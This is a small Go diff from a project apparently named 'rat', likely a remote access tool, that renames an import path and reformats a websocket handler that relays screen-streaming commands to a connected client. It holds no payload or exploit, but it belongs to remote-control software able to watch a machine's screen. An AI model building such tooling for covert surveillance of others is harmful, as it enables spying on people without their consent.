@@ -3,7 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
-	"rat/shared"
+	"rat/shared/network/header"
 	"time"
 
 	"golang.org/x/net/websocket"
@@ -47,9 +47,9 @@ func (d ScreenUpdateMessage) Handle(ws *websocket.Conn, client *Client, data str
 	scale := screenEvent.Scale
 	monitor := screenEvent.Monitor
 
-	client.Listeners[shared.MonitorsHeader] = ws
+	client.Listeners[header.MonitorsHeader] = ws
 
-	packet := ScreenPacket{Activate:stream, Scale:scale, Monitor:monitor}
+	packet := ScreenPacket{Activate: stream, Scale: scale, Monitor: monitor}
 	client.Queue <- &packet
 
 	if !client.Screen.Streaming {
